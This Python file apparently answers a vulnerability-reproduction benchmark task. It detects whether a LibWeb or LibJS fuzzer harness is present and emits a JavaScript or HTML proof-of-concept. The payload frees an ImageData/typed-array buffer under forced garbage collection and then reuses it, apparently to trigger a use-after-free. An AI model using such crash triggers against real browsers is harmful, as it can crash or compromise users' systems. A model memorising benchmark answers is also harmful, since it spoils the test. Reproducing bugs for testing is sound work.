import os
import tarfile
from typing import Optional


class Solution:
    def _infer_mode(self, src_path: str) -> str:
        # Returns "html" or "js"
        def decide_from_name(name: str) -> Optional[str]:
            n = name.replace("\\", "/")
            if "Fuzz" in n or "fuzz" in n:
                if "/LibWeb/" in n or "LibWeb" in n:
                    return "html"
                if "/LibJS/" in n or "LibJS" in n:
                    return "js"
            if n.endswith((".html", ".htm")) and ("Fuzz" in n or "fuzz" in n):
                return "html"
            if n.endswith((".js",)) and ("Fuzz" in n or "fuzz" in n):
                return "js"
            return None

        def decide_from_content(data: bytes) -> Optional[str]:
            if b"LLVMFuzzerTestOneInput" not in data:
                return None
            if b"LibWeb" in data or b"#include <LibWeb" in data or b"HTML::Parser" in data:
                return "html"
            if b"LibJS" in data or b"#include <LibJS" in data or b"JS::Parser" in data:
                return "js"
            return None

        # Prefer fuzzer harness hints.
        if os.path.isdir(src_path):
            mode = None
            count = 0
            for root, _, files in os.walk(src_path):
                for fn in files:
                    path = os.path.join(root, fn)
                    rel = os.path.relpath(path, src_path).replace("\\", "/")
                    m = decide_from_name(rel)
                    if m:
                        return m
                    if rel.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                        try:
                            st = os.stat(path)
                        except OSError:
                            continue
                        if st.st_size > 2_000_000:
                            continue
                        try:
                            with open(path, "rb") as f:
                                data = f.read(400_000)
                        except OSError:
                            continue
                        m = decide_from_content(data)
                        if m:
                            return m
                    count += 1
                    if count > 3000:
                        break
                if count > 3000:
                    break
            # If it's a LibWeb-focused tree, HTML is more likely.
            if os.path.isdir(os.path.join(src_path, "Userland", "Libraries", "LibWeb")):
                mode = "html"
            return mode or "js"

        # Tarball case
        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                # First pass: names
                for mi in members[:20000]:
                    m = decide_from_name(mi.name)
                    if m:
                        return m
                # Second pass: contents of likely fuzzer files
                checked = 0
                for mi in members:
                    if not mi.isfile():
                        continue
                    name = mi.name.replace("\\", "/")
                    if "Fuzz" not in name and "fuzz" not in name and "Fuzzer" not in name:
                        continue
                    if not name.endswith((".c", ".cc", ".cpp", ".cxx")):
                        continue
                    if mi.size <= 0 or mi.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(mi)
                        if not f:
                            continue
                        data = f.read(400_000)
                    except Exception:
                        continue
                    m = decide_from_content(data)
                    if m:
                        return m
                    checked += 1
                    if checked >= 200:
                        break
        except Exception:
            pass

        # Default guess: LibWeb tasks often expect HTML inputs.
        return "html"

    def _payload_js(self) -> str:
        # Keep it compact but with strong GC pressure.
        return (
            "(()=>{let a=0;"
            "try{a=new Uint8ClampedArray(65536);}catch(e){}"
            "if(!a)try{let i=new ImageData(128,128);a=i.data;i=null;}catch(e){}"
            "if(!a)try{let c=document.createElement('canvas');c.width=c.height=128;let x=c.getContext('2d');let i=x.createImageData(128,128);a=i.data;i=null;x=null;c=null;}catch(e){}"
            "if(!a)return;"
            "function p(){for(let i=0;i<512;i++)new ArrayBuffer(1<<17);for(let i=0;i<50000;i++)({x:i});}"
            "for(let t=0;t<4;t++){if(typeof gc=='function')gc();p();}"
            "if(typeof gc=='function')gc();"
            "a[0]=7;for(let i=0;i<20000;i++)a[0]^=i;let s=0;for(let i=0;i<20000;i++)s+=a[0];"
            "if(s===-1)throw 0;"
            "})();"
        )

    def solve(self, src_path: str) -> bytes:
        mode = self._infer_mode(src_path)
        js = self._payload_js()
        if mode == "js":
            return js.encode("utf-8", "strict")
        html = "<script>" + js + "</script>"
        return html.encode("utf-8", "strict")